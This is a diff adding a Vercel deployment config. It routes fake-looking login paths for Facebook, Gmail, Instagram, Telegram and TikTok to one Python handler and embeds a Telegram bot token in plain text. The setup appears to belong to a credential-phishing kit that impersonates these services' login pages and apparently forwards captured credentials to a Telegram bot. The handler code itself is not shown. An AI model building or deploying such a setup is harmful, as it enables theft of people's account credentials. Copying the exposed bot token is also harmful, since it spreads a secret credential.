@@ -1,0 +1,66 @@
+{
+  "version": 2,
+  "builds": [
+    {
+      "src": "api/main.py",
+      "use": "@vercel/python"
+    }
+  ],
+  "routes": [
+    {
+      "src": "/",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/facebook",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/facebook/login",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/gmail",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/gmail/login",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/instagram",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/instagram/login",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/telegram",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/telegram/login",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/tiktok",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/tiktok/login",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/health",
+      "dest": "/api/main.py"
+    },
+    {
+      "src": "/(.*)",
+      "dest": "/api/main.py"
+    }
+  ],
+  "env": {
+    "TELEGRAM_BOT_TOKEN": "8593966553:AAFGoliiS_woNCydJhXBQ6sdi2xhKTAdAoc"
+  }
+}
